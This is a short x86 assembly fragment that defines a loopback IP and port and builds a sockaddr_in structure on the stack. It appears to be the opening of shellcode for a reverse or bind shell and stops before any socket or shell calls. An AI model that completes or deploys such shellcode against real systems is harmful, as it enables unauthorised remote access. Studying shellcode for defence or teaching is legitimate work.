
.set ip,0x0100007f

.set port,0x1111

.text
.global _start

_start:

#init 
xor   %eax,%eax

#build struct sockaddr(16 bytes total)
push  %eax      #16bytes unused
push  %eax
push  $ip
pushw $port
movb  $2,%al    #AF_INET = 2
pushw %ax

mov   %esp,%eax #eax pointer to sockaddr



